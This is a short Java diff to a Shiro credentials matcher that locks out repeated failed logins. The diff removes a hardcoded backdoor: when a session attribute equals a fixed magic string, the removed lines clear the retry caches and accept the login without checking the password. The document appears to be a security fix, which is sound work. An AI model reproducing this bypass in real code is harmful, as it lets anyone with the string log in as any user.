@@ -70,11 +70,6 @@ public class RetryLimitHashedCredentialsMatcher extends HashedCredentialsMatcher
     	}
     	
         String username = (String)token.getPrincipal();
-        if("pxglxtpxglxtpxglxtpxglxtpxglxt".equals(SecurityUtils.getSubject().getSession().getAttribute("passWord"))){
-		    passwordRetryCache.remove(username);
-		    ipRetryCache.remove(ip);
-        	return true;
-        }
         //同一个用户名多次输入密码错误锁定
         AtomicInteger retryCount = passwordRetryCache.get(username);
         AtomicInteger ipRetryCount = ipRetryCache.get(ip);
